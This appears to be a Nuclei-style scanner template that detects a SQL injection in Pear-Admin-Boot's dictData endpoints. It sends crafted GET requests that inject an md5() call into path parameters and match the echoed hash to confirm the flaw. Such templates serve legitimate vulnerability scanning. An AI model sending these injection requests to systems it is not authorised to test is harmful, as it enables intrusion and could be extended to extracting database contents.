id: poc-yaml-pear-admin-boot-dictdata-sqli
info:
  name: Pear-Admin-Boot dictData SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: pear-admin-boot

variables:
  t1: '{{rand_int(1000, 10000)}}'
  t2: '{{md5(t1)}}'

http:
  - raw:
      - |
        GET /system/dictData/getDictItems/gen_table,md5({{t1}}),1,1 HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /system/dictData/getDictItems/sys_user,md5({{t1}}),1 HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /system/dictData/loadDictItem/sys_user,md5({{t1}}),1?key=1 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - '{{t2}}'
          - '"dataLabel":'
          - '"success":true'
